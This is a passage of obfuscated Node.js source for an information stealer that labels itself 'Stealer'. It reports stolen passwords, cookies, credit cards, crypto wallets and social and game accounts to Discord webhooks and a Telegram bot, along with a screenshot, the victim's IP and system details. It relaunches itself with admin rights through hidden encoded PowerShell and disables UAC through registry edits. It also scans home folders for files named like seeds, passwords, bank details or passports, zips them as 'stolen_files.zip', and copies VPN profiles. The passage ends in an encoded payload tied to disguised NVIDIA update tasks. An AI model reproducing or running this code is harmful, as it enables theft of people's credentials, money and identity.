                      value: z.mtVvH(z.WUkYQ("``", "`" + c9.email + "`"), "``"),
                      inline: true
                    }, {
                      name: z.FiIRW,
                      value: z.bbJRT("``" + ("`" + bY + "`"), "``"),
                      inline: true
                    }, {
                      name: z.UzZKb,
                      value: z.XZjKd(z.XZjKd("``", "`" + (c9.phone || z.TXphp) + "`"), "``"),
                      inline: true
                    }, {
                      name: "",
                      value: "‎ ",
                      inline: false
                    }, ch, ci, cj, {
                      name: "",
                      value: "‎ ",
                      inline: false
                    }, cm],
                    footer: {
                      text: os.hostname() + " | Stealer | " + VERSION,
                      icon_url: ""
                    }
                  };
                  active_nodes.length = 0;
                  if (discordWebhookUrl && z.QcQfm(discordWebhookUrl, z.tsbhb)) {
                    active_nodes.push(discordWebhookUrl);
                  }
                  if (fallback_conf && Array.isArray(fallback_conf) && fallback_conf.length > 0) {
                    if (z.hPXny === z.hPXny) {
                      fallback_conf.forEach(cp => {
                        const cq = {
                          EpdXj: z.Xoxql,
                          BhIfk: "ignore"
                        };
                        const cr = cq;
                        if (z.ybKgM("MntCl", z.aariQ)) {
                          E.push(z.tTKFU);
                        } else {
                          try {
                            if (z.iFQtI === z.iFQtI) {
                              if (cp.includes(z.svjNc)) {
                                active_nodes.push(cp);
                              }
                            } else {
                              E(cr.EpdXj, {
                                stdio: cr.BhIfk,
                                windowsHide: true
                              });
                            }
                          } catch (cu) {}
                        }
                      });
                    } else {
                      var cq = I.from(J, z.UDwgt);
                      var cr = K.createDecipheriv(z.aiWlV, L.from(M, "hex"), cq.slice(0, 12));
                      cr.setAuthTag(cq.slice(12, 28));
                      return z.mtVvH(cr.update(cq.slice(28), null, "utf8"), cr.final("utf8"));
                    }
                  }
                  let co = 1;
                  for (const cq of active_nodes) {
                    await z.nNUMJ(sleep, 2500);
                    try {
                      const cr = {
                        embeds: [cn]
                      };
                      await axios.post(cq, cr, {
                        timeout: 10000
                      });
                      logSuccess("0x" + co + "T1");
                    } catch (ct) {
                      z.Geakz(logError, "0x" + co + "T2", "DX_03");
                    }
                    co++;
                  }
                } catch (cu) {}
              }
            }
            bX += z.bGCYY(c8, "\n");
          }
        }
        fs.writeFileSync(bW, bX, z.HYWYX);
      }
    }
  } catch (cv) {
    if (z.prLFK !== "mpPSy") {
      F.push("  ... and " + (G.length - 5) + " more instances");
    } else {
      z.PJsYV(logError, cv, z.VTPKU);
    }
  }
  return T;
}
async function sendDiscordEmbed(o, p, q, r, s, t, u, v, w, x, y) {
  try {
    let A = "Not available";
    try {
      const J = await axios.get("http://ip-api.com/json/", {
        timeout: 10000
      });
      A = J.data.query + " - " + J.data.country + ", " + J.data.city + " ";
    } catch (L) {
      try {
        const O = await axios.get("https://api.ipify.org?format=json", {
          timeout: 10000
        });
        A = O.data.ip;
      } catch (P) {
        logError(L, "sendDiscordEmbed-ipLookup");
        A = "IP retrieval error";
      }
    }
    const B = "User: " + user.username + "\nPC: " + user.hostname + "\nOS: " + user.type + " " + user.release + "\nArch: " + user.arch + "\nRAM: " + (user.ram / 1024 / 1024 / 1024).toFixed(2) + " GB\nCores: " + user.countCore + "\nUUID: " + user.randomUUID + "\nStarted: " + new Date(user.start).toLocaleString() + "\nUptime: " + Math.floor(user.uptime / 3600) + "h " + Math.floor(user.uptime % 3600 / 60) + " m\nIP: " + A + "\nDirectory: " + user.fileLoc + " ";
    const C = (w || 0) + (v || 0);
    const D = "";
    const E = {
      name: user.hostname + " | System Information | Stealer",
      icon_url: D
    };
    const F = {
      name: "‎ ",
      value: p ? "<a:ezgif60edbd9e19348b91:1466848649651683430> [`" + locale + "-" + computerName + ".zip`](" + p + ")` (" + q + ")`\n" : "❌ **Upload failed (" + q + ") (Look in log.txt)**",
      inline: false
    };
    const G = {
      embeds: [{
        title: "",
        description: "‎",
        color: 3158071,
        author: E,
        fields: [{
          name: "<a:ezgif6fb4a91bfdb1d6e8:1466846913352564736> Passwords",
          value: "```" + r.toString() + "```",
          inline: true
        }, {
          name: "<a:ezgif47677b19991af31d:1466838443496575172> Cookies",
          value: "```" + s.toString() + "```",
          inline: true
        }, {
          name: "📋 Autofills",
          value: "```" + t.toString() + "```",
          inline: true
        }, {
          name: "💳 Credit Cards",
          value: "```" + (u || 0).toString() + "```",
          inline: true
        }, {
          name: "<a:ezgif76c1f0814cb13e11:1466857030118801532> Socials",
          value: "```" + C.toString() + "```",
          inline: true
        }, {
          name: "<a:ezgif32bff8f86ee21b42:1466865550347993289> Games",
          value: "```" + x.toString() + "```",
          inline: true
        }, {
          name: "<a:ezgif69c15e2348c7f50f:1466845005237719071> Wallets",
          value: "```" + (y || 0).toString() + "```",
          inline: true
        }, {
          name: "<a:system:1205123587632275517> Information",
          value: "```\n" + B + "\n```",
          inline: false
        }, F],
        image: {
          url: "attachment://screenshot.png"
        },
        footer: {
          text: computerName + " | Stealer | " + VERSION,
          icon_url: D
        }
      }]
    };
    try {
      if (G.embeds && G.embeds[0]) {
        const S = G.embeds[0];
        if (S.fields) {
          S.fields.forEach(T => {
            const V = {
              oWFLO: "utf8"
            };
            if (T.value && T.value.length > 1020) {
              T.value = T.value.substring(0, 1000) + "... (truncated)";
            }
          });
        }
        if (S.description && S.description.length > 2000) {
          S.description = S.description.substring(0, 1990) + "... (truncated)";
        }
      }
    } catch (W) {}
    active_nodes.length = 0;
    if (discordWebhookUrl && discordWebhookUrl !== "REMPLACE_ME") {
      active_nodes.push(discordWebhookUrl);
    }
    if (fallback_conf && Array.isArray(fallback_conf) && fallback_conf.length > 0) {
      fallback_conf.forEach(Y => {
        try {
          if (Y.includes("http")) {
            active_nodes.push(Y);
          }
        } catch (a1) {}
      });
    }
    let H = 1;
    for (const Y of active_nodes) {
      await new Promise(Z => setTimeout(Z, 3000));
      try {
        const Z = new FormData();
        Z.append("payload_json", JSON.stringify(G));
        Z.append("file", o, {
          filename: "screenshot.png",
          contentType: "image/png"
        });
        await axios.post(Y, Z, {
          headers: Z.getHeaders(),
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
          timeout: 45000
        });
        logSuccess("0x" + H + "A7");
      } catch (a1) {
        const a2 = a1.response ? JSON.stringify(a1.response.data) || a1.message : a1.message;
        logError("0x" + H + "E1: " + a2, "DX_01");
        await new Promise(a3 => setTimeout(a3, 2000));
        try {
          const a3 = JSON.parse(JSON.stringify(G));
          if (a3.embeds && a3.embeds[0]) {
            delete a3.embeds[0].image;
            a3.embeds[0].footer.text += " | ❌ Image Failed";
          }
          await axios.post(Y, a3, {
            headers: {
              "Content-Type": "application/json"
            },
            timeout: 20000
          });
          logSuccess("0x" + H + "B2");
        } catch (a7) {
          logError("0x" + H + "E2", "DX_02");
        }
      }
      H++;
    }
    if (!p) {
      try {
        const aa = path.join(mainFolderPath, "log.txt");
        let ab = "No log file found.";
        if (fs.existsSync(aa)) {
          ab = fs.readFileSync(aa, "utf8");
        }
        const ac = [];
        const ad = 3500;
        for (let ag = 0; ag < ab.length; ag += ad) {
          ac.push(ab.substring(ag, ag + ad));
        }
        let ae = 1;
        for (const ai of active_nodes) {
          await new Promise(ak => setTimeout(ak, 3000));
          for (let ak = 0; ak < ac.length; ak++) {
            await new Promise(ao => setTimeout(ao, 2500));
            const al = {
              name: user.hostname + " | Error Log | Stealer",
              icon_url: ""
            };
            const am = {
              text: computerName + " | Stealer | " + VERSION,
              icon_url: ""
            };
            const an = {
              title: "📂 Debug Log - Part " + (ak + 1) + "/" + ac.length,
              description: "```text\n" + ac[ak] + "\n```",
              color: 3158071,
              author: al,
              footer: am
            };
            try {
              const ap = {
                embeds: [an],
                username: "System Service",
                avatar_url: ""
              };
              await axios.post(ai, ap, {
                headers: {
                  "Content-Type": "application/json"
                },
                timeout: 30000
              });
            } catch (as) {
              console.error("0x" + ae + "L9:", as.message);
            }
          }
          ae++;
        }
      } catch (av) {
        logError(av, "SR_05");
      }
    }
  } catch (az) {
    logError(az, "sendDiscordEmbed");
  }
}
async function sendTelegramMessage(d, g, h, i, j, k, l, m, n, o, p) {
  try {
    if (!telegramBotToken || telegramBotToken === "REMPLACE_ME" || !telegramChatId || telegramChatId === "REMPLACE_ME") {
      return;
    }
    let r = "Not available";
    try {
      const z = await axios.get("http://ip-api.com/json/", {
        timeout: 10000
      });
      r = z.data.query + " - " + z.data.country + ", " + z.data.city;
    } catch (B) {
      try {
        const E = await axios.get("https://api.ipify.org?format=json", {
          timeout: 10000
        });
        r = E.data.ip;
      } catch (F) {
        logError(B, "sendTelegramMessage-ipLookup");
        r = "IP retrieval error";
      }
    }
    const s = (n || 0) + (m || 0);
    const t = ("\n<b>" + user.hostname + " | System Information</b>\n\n<b>Collected Data:</b>\n━━━━━━━━━━━━━━━━━━━━\n🔐 <b>Passwords:</b> <code>" + i + "</code>\n🍪 <b>Cookies:</b> <code>" + j + "</code>\n📋 <b>Autofills:</b> <code>" + k + "</code>\n💳 <b>Credit Cards:</b> <code>" + (l || 0) + "</code>\n📱 <b>Socials:</b> <code>" + s + "</code>\n🎮 <b>Games:</b> <code>" + o + "</code>\n💰 <b>Wallets:</b> <code>" + (p || 0) + "</code>\n\n⚙ <b>System Information:</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>User:</b> <code>" + user.username + "</code>\n<b>PC:</b> <code>" + user.hostname + "</code>\n<b>OS:</b> <code>" + user.type + " " + user.release + "</code>\n<b>Arch:</b> <code>" + user.arch + "</code>\n<b>RAM:</b> <code>" + (user.ram / 1024 / 1024 / 1024).toFixed(2) + " GB</code>\n<b>Cores:</b> <code>" + user.countCore + "</code>\n<b>UUID:</b> <code>" + user.randomUUID + "</code>\n<b>Started:</b> <code>" + new Date(user.start).toLocaleString() + "</code>\n<b>Uptime:</b> <code>" + Math.floor(user.uptime / 3600) + "h " + Math.floor(user.uptime % 3600 / 60) + "m</code>\n<b>IP:</b> <code>" + r + "</code>\n<b>Directory:</b> <code>" + user.fileLoc + "</code>\n\n" + (g ? "<b>Download:</b> <a href=\"" + g + "\"><code>" + locale + "-" + computerName + ".zip</code></a><code> (" + h + ")</code>" : "❌ <b>Upload failed</b> (<code>" + h + "</code>) (Look in log.txt)") + "\n\n━━━━━━━━━━━━━━━━━━━━\n🔹 " + computerName + " | Stealer | " + VERSION + "\n").trim();
    const u = new FormData();
    u.append("chat_id", telegramChatId);
    u.append("photo", d, {
      filename: "screenshot.png",
      contentType: "image/png"
    });
    u.append("caption", t);
    u.append("parse_mode", "HTML");
    const w = "https://api.telegram.org/bot" + telegramBotToken + "/sendPhoto";
    const x = await axios.post(w, u, {
      headers: u.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 30000
    });
    if (x.status >= 200 && x.status < 300) {}
    if (!g) {
      try {
        const H = path.join(mainFolderPath, "log.txt");
        if (fs.existsSync(H)) {
          const I = new FormData();
          I.append("chat_id", telegramChatId);
          I.append("document", fs.createReadStream(H), {
            filename: "log.txt",
            contentType: "text/plain"
          });
          I.append("caption", "❌ <b>Upload failed</b> - Debug log for <code>" + user.hostname + "</code>");
          I.append("parse_mode", "HTML");
          const J = "https://api.telegram.org/bot" + telegramBotToken + "/sendDocument";
          await axios.post(J, I, {
            headers: I.getHeaders(),
            timeout: 30000
          });
        }
      } catch (L) {}
    }
  } catch (N) {
    logError(N, "sendTelegramMessage");
  }
}
function hasAdminPrivileges() {
  try {
    execSync("net session", {
      stdio: "ignore",
      timeout: 5000,
      windowsHide: true
    });
    return true;
  } catch (i) {
    return false;
  }
}
function relaunchAsAdmin() {
  const b = {
    gImqz: function (l) {
      return l();
    },
    UuTrP: "--hidden",
    COWvb: "--folder",
    PfyfT: function (l, m) {
      return l !== m;
    },
    tJbSR: "Vlrik",
    FNEHe: "utf16le",
    bgkTq: "ignore"
  };
  const c = process.execPath;
  const d = path.dirname(c);
  const g = process.argv.slice(1);
  if (!g.includes(b.UuTrP)) {
    g.push(b.UuTrP);
  }
  if (!g.includes(b.COWvb)) {
    if (b.PfyfT("iLkaq", b.tJbSR)) {
      g.push(b.COWvb, mainFolderName);
    } else {
      b.gImqz(b);
    }
  }
  const h = g.map(m => "\"" + m + "\"").join(",");
  const i = "Start-Process -FilePath \"" + c + "\" -ArgumentList " + h + " -WorkingDirectory \"" + d + "\" -Verb RunAs -WindowStyle Hidden";
  const j = Buffer.from(i, b.FNEHe).toString("base64");
  const k = {
    windowsHide: true,
    stdio: b.bgkTq,
    timeout: 30000
  };
  execSync("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + j, k);
  process.exit(0);
}
async function mainAdminCheck() {
  if (!hasAdminPrivileges()) {
    relaunchAsAdmin();
  } else {}
}
function disableuac() {
  if (process.platform !== "win32") {
    return;
  }
  const c = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f; reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f";
  try {
    execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + c + "\"", {
      stdio: "ignore",
      windowsHide: true
    });
  } catch (g) {
    logError(g, "disableuac");
  }
}
async function fetchFileVPN() {
  const h = {
    ABcZf: function (i, j, k) {
      return i(j, k);
    },
    AkieY: function (i, j) {
      return i(j);
    },
    aXFwQ: "\\Local\\",
    lVJrO: "utf8",
    tmhcQ: "2|0|3|1|4",
    CDfay: "N/A",
    FJAIU: "---",
    QngEK: "aes-256-gcm",
    TEeuZ: function (i, j, k) {
      return i(j, k);
    },
    porwm: "getmac",
    KBdlV: "pipe",
    WODKY: function (i, j) {
      return i + j;
    },
    vXmRa: "v10Key-DPAPI-",
    gvZlr: "unknown",
    sDYMa: "emoji",
    UjzUr: "user_data",
    QHBgQ: "user_data#2",
    nsHZC: "user_data#3",
    yeAOp: "user_data#4",
    TYiJp: "user_data#5",
    vMtWF: "working",
    MVLAf: "temp",
    eKhNF: "temp_data",
    xOpPj: function (i, j, k) {
      return i(j, k);
    },
    Ilrrp: "walletInjection",
    svTkC: function (i, j) {
      return i === j;
    },
    kyXdN: "YzvGs",
    fNLmP: "PhGTZ",
    Sjzez: "VPN",
    gmCiq: "OpenVPN Connect\\profiles",
    olbAP: "NordVPN",
    Jatyd: "ProtonVPN",
    rXAjv: function (i, j, k) {
      return i(j, k);
    },
    CkFiU: "Videos",
    vowEn: "Desktop",
    aUgKY: "Downloads",
    YStVq: "Pictures",
    GARuz: "AppData",
    wgNPc: "Roaming",
    AtVXL: "Windows",
    egXnm: "Recent",
    YUBRx: ".rdp",
    zcRes: ".txt",
    FCGWs: ".docx",
    MpRzZ: ".pdf",
    lUdcm: ".csv",
    ntGja: ".xls",
    QwQoG: ".xlsx",
    beYrf: ".keys",
    sfzEx: ".log",
    daAJR: "secret",
    BUAjv: "password",
    sMzyi: "wallet",
    xcYWv: "default",
    ryIoS: "mdp",
    YiFPx: "motdepasse",
    fhyMD: "bot",
    pYxQv: "atomic",
    Jnosp: "acount",
    NLcYn: "paypal",
    KtCSq: "metamask",
    QiycQ: "discord",
    iMcuM: "2fa",
    Hxnvs: "code",
    xLKBK: "memo",
    TfFgv: "compte",
    ZZXPY: "token",
    ShfPA: "seed",
    bFBez: "mnemonic",
    Wweii: "memoric",
    uIhWI: "private",
    ANjIg: "passphrase",
    AYQEY: "pass",
    shlWr: "phrase",
    bHsul: "bank",
    disMS: "casino",
    rkJev: "prv",
    LSczh: "privÃ©",
    IEeGG: "prive",
    EQTFt: "telegram",
    lSOWF: "identifiants",
    jEpUO: "trading",
    XnoXI: "sauvegarde",
    omkBI: "funds",
    wwavZ: "note",
    UBvbu: "phantom",
    LJTsD: "trust",
    BfJeQ: "trezor",
    tFbJg: "binance",
    VHhBd: "coinbase",
    GSxob: "solana",
    gcVPm: "ethereum",
    WFvIj: "invoice",
    HiBXK: "facture",
    jAZgb: "passeport",
    UbhAM: "identity",
    xdGSs: "identite",
    dAeJI: "permis",
    WjfdL: "confidential",
    RMhnS: "stripe",
    ZamWl: "mastercard",
    PBqeX: "card",
    aoAVq: "amex",
    FYMUf: "wire",
    dPBnZ: "transfer",
    yEmrG: "iban",
    eaZZN: "credentials",
    lbwud: "creds",
    wLdcW: "database",
    bLBzP: "sql",
    xYHlL: "ssh",
    FpalD: "putty",
    OIPyy: "vnc",
    vkIRz: "anydesk",
    qXBrj: "authy",
    pcPjY: "kucoin",
    BqDeE: "okx",
    PJuvX: "bybit",
    ZGhsx: "bitget",
    hfRFb: "mexc",
    GGAmR: "recovery",
    pvutq: "authenticator",
    OUGlT: function (i, j) {
      return i === j;
    },
    LNujj: "QnQvu",
    jXBzV: "CfVfY",
    SODgt: function (i, j) {
      return i !== j;
    },
    ydcgW: "HIOot",
    GfIKD: "YhdsQ",
    agAZg: function (i, j) {
      return i === j;
    },
    PTjLR: function (i, j) {
      return i !== j;
    },
    ziXWL: "JbINY",
    tdziM: "VgBDP",
    bUJOf: function (i, j) {
      return i === j;
    },
    octMz: ".zip",
    CwUhI: function (i, j) {
      return i === j;
    },
    OMFAc: ".7z",
    cCaZq: function (i, j) {
      return i === j;
    },
    rLTvq: ".iso",
    BiweT: "fRyeA",
    xwEUm: "txkPo",
    Owffy: function (i, j) {
      return i > j;
    },
    pmaeT: "EgBQv",
    dGoIZ: "WDTYk",
    WPDOv: function (i, j) {
      return i !== j;
    },
    SsmyG: "CMUYh",
    FMpPF: "yzRbX",
    pWfRe: function (i, j) {
      return i === j;
    },
    soUxp: "FDRAQ",
    hEZRb: "stolen_files.zip",
    uqhkH: "XTOVc",
    TBKJu: "fetchFileVPN-zip",
    cXQsw: function (i, j) {
      return i !== j;
    },
    gxSmi: "SDgSP",
    ftUSv: "PvcnR",
    tfGfO: "MkBws",
    ooDTB: "EMUOI",
    shkHs: "fetchFileVPN"
  };
  try {
    if (h.svTkC(h.kyXdN, h.fNLmP)) {
      c.mkdirSync(d, {
        recursive: true
      });
    } else {
      const j = path.join(mainFolderPath, h.Sjzez);
      const k = [path.join(process.env.APPDATA, h.gmCiq), path.join(process.env.LOCALAPPDATA, h.olbAP), path.join(process.env.APPDATA, h.Jatyd)];
      let l = 0;
      for (const u of k) {
        if (fs.existsSync(u)) {
          if (h.svTkC("IEWsI", "XafqC")) {
            h.ABcZf(d, g, "inject-license-" + h);
          } else {
            if (!fs.existsSync(j)) {
              fs.mkdirSync(j, {
                recursive: true
              });
            }
            await h.rXAjv(copyFolderRecursive, u, path.join(j, path.basename(u)));
            l++;
          }
        }
      }
      const m = path.join(os.tmpdir(), h.AkieY(generateRandomString, 10));
      const n = {
        recursive: true
      };
      if (!fs.existsSync(m)) {
        fs.mkdirSync(m, n);
      }
      const o = os.homedir();
      const q = [h.CkFiU, h.vowEn, "Documents", h.aUgKY, h.YStVq, path.join(h.GARuz, h.wgNPc, "Microsoft", h.AtVXL, h.egXnm)];
      const r = [h.YUBRx, h.zcRes, ".doc", h.FCGWs, h.MpRzZ, h.lUdcm, h.ntGja, h.QwQoG, h.beYrf, ".ldb", h.sfzEx];
      const s = [h.daAJR, h.BUAjv, "account", "tax", "key", h.sMzyi, "gang", h.xcYWv, "backup", "passw", h.ryIoS, h.YiFPx, "acc", "mot_de_passe", "login", h.fhyMD, h.pYxQv, h.Jnosp, h.NLcYn, "banque", h.KtCSq, "crypto", "exodus", h.QiycQ, h.iMcuM, h.Hxnvs, h.xLKBK, h.TfFgv, h.ZZXPY, h.ShfPA, h.bFBez, h.Wweii, h.uIhWI, h.ANjIg, h.AYQEY, h.shlWr, "steal", h.bHsul, "info", h.disMS, h.rkJev, h.LSczh, h.IEeGG, h.EQTFt, "identifiant", h.lSOWF, "personnel", h.jEpUO, "bitcoin", h.XnoXI, h.omkBI, "recup", h.wwavZ, h.UBvbu, h.LJTsD, "ledger", h.BfJeQ, h.tFbJg, h.VHhBd, h.GSxob, h.gcVPm, h.WFvIj, h.HiBXK, "passport", h.jAZgb, h.UbhAM, h.xdGSs, "id_card", h.dAeJI, h.WjfdL, h.RMhnS, "visa", h.ZamWl, h.PBqeX, h.aoAVq, h.FYMUf, h.dPBnZ, h.yEmrG, h.eaZZN, h.lbwud, h.wLdcW, h.bLBzP, "dump", "config", "env", h.xYHlL, h.FpalD, h.OIPyy, h.vkIRz, "teamviewer", h.qXBrj, "kraken", h.pcPjY, "gateio", h.BqDeE, h.PJuvX, h.ZGhsx, h.hfRFb, "mnemonique", h.GGAmR, "identifiants_connexion", h.pvutq];
      let t = 0;
      for (const x of q) {
        const y = path.join(o, x);
        if (fs.existsSync(y)) {
          if (h.OUGlT(h.LNujj, h.jXBzV)) {
            h.AkieY(g, "[Catbox] Success (matched): " + h[0]);
            return h.AkieY(i, j[0]);
          } else {
            try {
              const A = fs.readdirSync(y);
              for (const B of A) {
                if (h.SODgt(h.ydcgW, h.GfIKD)) {
                  try {
                    if (h.agAZg("jmmSQ", "jmmSQ")) {
                      const C = path.join(y, B);
                      const D = fs.statSync(C);
                      if (D.isFile()) {
                        if (h.PTjLR(h.ziXWL, h.tdziM)) {
                          const E = path.extname(B).toLowerCase();
                          if (E === ".exe" || h.bUJOf(E, h.octMz) || h.CwUhI(E, ".rar") || h.OUGlT(E, h.OMFAc) || h.cCaZq(E, ".msi") || E === h.rLTvq || h.cCaZq(E, ".msix")) {
                            continue;
                          }
                          const F = path.basename(B).toLowerCase();
                          if (r.includes(E) && s.some(G => F.includes(G))) {
                            if (h.PTjLR(h.BiweT, h.xwEUm)) {
                              if (h.Owffy(D.size, MAX_ITEM_SIZE)) {
                                h.AkieY(logInfo, "[Scavenger] Skipping file too large: " + C + " (" + formatBytes(D.size) + ")");
                                continue;
                              }
                              if (h.Owffy(globalCopiedSize + D.size, MAX_TEMPORARY_TOTAL_SIZE)) {
                                if (h.OUGlT(h.pmaeT, h.dGoIZ)) {
                                  c = d.split(h.aXFwQ)[1].split("\\")[0];
                                } else {
                                  if (!globalLimitReached) {
                                    if (h.WPDOv(h.SsmyG, h.FMpPF)) {
                                      logInfo("[Scavenger] Global storage limit reached at: " + C);
                                      globalLimitReached = true;
                                    } else {
                                      const K = m.parse(n.readFileSync(o, h.lVJrO));
                                      p.push("=== Minecraft Launcher Accounts ===");
                                      for (const [L, M] of w.entries(K.accounts || {})) {
                                        const N = h.tmhcQ.split("|");
                                        let O = 0;
                                        while (true) {
                                          switch (N[O++]) {
                                            case "0":
                                              D.push("Username: " + (M.username || h.CDfay));
                                              continue;
                                            case "1":
                                              F.push("Type: " + (M.type || h.CDfay));
                                              continue;
                                            case "2":
                                              C.push("Account ID: " + L);
                                              continue;
                                            case "3":
                                              E.push("UUID: " + (M.profileId || "N/A"));
                                              continue;
                                            case "4":
                                              G.push(h.FJAIU);
                                              continue;
                                          }
                                          break;
                                        }
                                      }
                                    }
                                  }
                                  break;
                                }
                              }
                              fs.copyFileSync(C, path.join(m, B));
                              t++;
                              globalCopiedSize += D.size;
                            } else {
                              try {
                                const J = o.createDecipheriv(h.QngEK, p, q);
                                J.setAuthTag(r);
                                return s.concat([J.update(t), J.final()]).toString(h.lVJrO);
                              } catch (K) {}
                            }
                          }
                        } else {
                          const K = h.TEeuZ(c, h.porwm, {
                            windowsHide: true,
                            stdio: h.KBdlV,
                            timeout: 5000
                          }).toString();
                          if (d.macs.some(L => K.includes(L))) {
                            return true;
                          }
                        }
                      }
                    } else {
                      g("[Skip] File too large (" + h(i.size) + "): " + j);
                      return false;
                    }
                  } catch (L) {}
                } else {
                  h.TEeuZ(g, h, h.WODKY(h.vXmRa, i[j][1] || h.gvZlr));
                }
              }
            } catch (N) {}
          }
        }
      }
      if (h.Owffy(t, 0)) {
        try {
          if (h.pWfRe("Whxur", h.soUxp)) {
            n = [h.sDYMa, h.UjzUr, h.QHBgQ, h.nsHZC, h.yeAOp, h.TYiJp, h.vMtWF, h.MVLAf, h.eKhNF];
          } else {
            const P = path.join(mainFolderPath, h.hEZRb);
            const Q = fs.createWriteStream(P);
            const T = h.xOpPj(archiver, "zip", {
              zlib: {
                level: 1
              }
            });
            T.pipe(Q);
            T.directory(m, false);
            await T.finalize();
          }
        } catch (U) {
          if (h.uqhkH === h.uqhkH) {
            h.TEeuZ(logError, U, h.TBKJu);
          } else {
            g(h);
            h.AkieY(i, j);
          }
        }
      }
      try {
        if (h.cXQsw(h.gxSmi, h.ftUSv)) {
          fs.rmSync(m, {
            recursive: true,
            force: true
          });
        } else {
          h.xOpPj(c, d, h.Ilrrp);
        }
      } catch (Y) {}
      return l + t;
    }
  } catch (Z) {
    if (h.tfGfO !== h.ooDTB) {
      h.rXAjv(logError, Z, h.shkHs);
      return 0;
    } else {
      c.push("Error reading instances: " + d.message);
    }
  }
}
function finalizeLog() {
  try {
    const g = "\nScript finished at: " + new Date().toISOString() + "\n";
    const h = path.join(mainFolderPath, "log.txt");
    fs.appendFileSync(h, g, "utf8");
  } catch (i) {}
}
function decodeBase64(a) {
  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let d = 0;
  let g = 0;
  let h = 0;
  const j = new Uint8Array(a.length * 5 / 8);
  for (let k = 0; k < a.length; k++) {
    g = g << 5 | c.indexOf(a[k].toUpperCase());
    d += 5;
    if (d >= 8) {
      j[h++] = g >>> d - 8 & 255;
      d -= 8;
    }
  }
  return Buffer.from(j.slice(0, h));
}
async function initializeService() {
  const b = {
    uVemQ: function (h, i) {
      return h(i);
    },
    QQGLR: function (h, i, j, k) {
      return h(i, j, k);
    },
    iCrnR: function (h, i) {
      return h + i;
    },
    zORoA: function (h, i) {
      return h(i);
    },
    IZjxu: "hex",
    IYOxi: function (h, i) {
      return h < i;
    },
    AWQeo: function (h, i) {
      return h | i;
    },
    ZeRBE: function (h, i) {
      return h << i;
    },
    uFdTR: function (h, i) {
      return h * i;
    },
    yASKo: function (h, i) {
      return h * i;
    },
    APLPW: function (h, i, j) {
      return h(i, j);
    },
    VBXYC: "createZipArchive",
    HNwYM: function (h, i, j) {
      return h(i, j);
    },
    sogFp: "close",
    SWrkW: "error",
    MnMtH: "fetchWallets",
    AOrvH: function (h, i) {
      return h + i;
    },
    bLPMj: function (h, i) {
      return h + i;
    },
    BXEdv: " -Command \"Start-Process ",
    pcici: "\\\"' -WindowStyle Hidden\"",
    nEaWP: function (h, i, j) {
      return h(i, j);
    },
    LXwlE: function (h, i) {
      return h >= i;
    },
    zmwvD: function (h, i) {
      return h & i;
    },
    wWWap: function (h, i) {
      return h - i;
    },
    hWYAs: function (h, i) {
      return h !== i;
    },
    tOhQm: "win32",
    WpRZY: function (h, i) {
      return h(i);
    },
    XDQNr: ".ps1",
    HqaHe: "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-ScheduledTask | Where-Object {$_.TaskName -like 'NVIDIA_SelfUpdate_*'} | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue }\"",
    dyNHG: function (h, i, j) {
      return h(i, j);
    },
    uMZPE: "ignore",
    MkWnN: function (h, i) {
      return h !== i;
    },
    lkAEP: "bPfpb",
    nfleU: "KJRak",
    OPxCv: "ryTjW",
    EiCXz: "iTPKx",
    YcOGh: "schtasks /delete /tn NVIDIA_SelfUpdate_* /f",
    UpXTO: "ER2GC43LJZQW2ZJAHUQCOTSWJFCESQK7KNSWYZSVOBSGC5DFL55SOIBLEAUEOZLUFVJGC3TEN5WSALKNNFXGS3LVNUQDCMBQGAYDAMBQEAWU2YLYNFWXK3JAHE4TSOJZHE4TSKJAFMQCO7JHBISHGY3SNFYHIUDBORUCAPJAERGXSSLOOZXWGYLUNFXW4LSNPFBW63LNMFXGILSQMF2GQCREOZRHGUDBORUCAPJAERZWG4TJOB2FAYLUNAQC24TFOBWGCY3FEATVYLTQOMYSIJZMEATS45TCOMTQUCRDEBBXEZLBORSSA2DJMRSGK3RAKZBFGIDXOJQXA4DFOIQHI3ZAMF3G62LEEBRW63TTN5WGKIDGNRQXG2AKORZHSID3BIQCAIBAER3GE42DN5XHIZLOOQQD2IBCINZGKYLUMVHWE2TFMN2CQYBCK5JWG4TJOB2C4U3IMVWGYYBCFEXFE5LOEBQCE4DPO5SXE43IMVWGYLTFPBSSALKFPBSWG5LUNFXW4UDPNRUWG6JAIJ4XAYLTOMQC2V3JNZSG652TOR4WYZJAJBUWIZDFNYQC2TTPKBZG6ZTJNRSSALKGNFWGKIDAEJQCEJDTMNZGS4DUKBQXI2DAEJQCEYBCFQQDALBAIZQWY43FEIFCAIBAEBNVG6LTORSW2LSJJ4XEM2LMMVOTUOSXOJUXIZKBNRWFIZLYOQUCI5TCONIGC5DIFQQCI5TCONBW63TUMVXHIKIKEAQCAIDJMYQCQVDFON2C2UDBORUCAJDWMJZVAYLUNAUSA6ZAMF2HI4TJMIQCW2BAEISHMYTTKBQXI2BCEB6QU7IKMNQXIY3IEB5X2CQKORZHSID3BIQCAIBAI5SXILKTMNUGKZDVNRSWIVDBONVSA7BAK5UGK4TFFVHWE2TFMN2CA6ZAERPS4VDBONVU4YLNMUQC23DJNNSSAISOKZEUISKBL5JWK3DGKVYGIYLUMVPSUIRAPUQHYICGN5ZEKYLDNAWU6YTKMVRXIID3BIQCAIBAEAQCAICVNZZGKZ3JON2GK4RNKNRWQZLEOVWGKZCUMFZWWIBNKRQXG22OMFWWKIBEL4XFIYLTNNHGC3LFEAWUG33OMZUXE3J2ERTGC3DTMUQC2RLSOJXXEQLDORUW63RAKNUWYZLOORWHSQ3PNZ2GS3TVMUFCAIBAEB6QU7IKMNQXIY3IEB5QUIBAEAQHGY3IORQXG23TEAXXC5L